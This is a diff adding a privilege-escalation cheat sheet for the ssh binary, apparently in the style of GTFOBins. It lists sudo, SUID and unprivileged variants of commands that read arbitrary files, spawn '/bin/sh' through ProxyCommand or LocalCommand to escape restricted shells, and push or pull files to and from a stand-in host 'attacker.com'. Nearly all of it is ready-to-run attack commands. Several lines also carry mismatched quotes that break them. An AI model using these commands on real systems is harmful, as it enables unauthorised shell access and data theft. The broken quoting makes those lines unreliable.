@@ -1,0 +1,70 @@
+ssh
+===
+
+Download
+--------
+
+[Sudo]
+    ssh user@attacker.com 'cat /path/to/input-file"
+
+[SUID]
+    ssh user@attacker.com 'cat /path/to/input-file"
+
+[Unprivileged]
+    ssh user@attacker.com 'cat /path/to/input-file"
+
+File read
+---------
+
+[Sudo]
+    ssh -F /path/to/input-file x
+    The read file content is corrupted by error prints.
+
+[SUID]
+    ssh -F /path/to/input-file x
+    The read file content is corrupted by error prints.
+
+[Unprivileged]
+    ssh -F /path/to/input-file x
+    The read file content is corrupted by error prints.
+
+Shell
+-----
+
+[Sudo]
+    ssh localhost /bin/sh
+    Reconnecting may help bypassing restricted shells.
+
+[SUID]
+    ssh localhost /bin/sh
+    Reconnecting may help bypassing restricted shells.
+
+[Unprivileged]
+    ssh localhost /bin/sh
+    Reconnecting may help bypassing restricted shells.
+
+[Sudo]
+    ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+
+[Unprivileged]
+    ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+
+[Sudo]
+    ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+    Spawn the shell on the client, but still requires a successful remote connection.
+
+[Unprivileged]
+    ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+    Spawn the shell on the client, but still requires a successful remote connection.
+
+Upload
+------
+
+[Sudo]
+    echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
+
+[SUID]
+    echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
+
+[Unprivileged]
+    echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
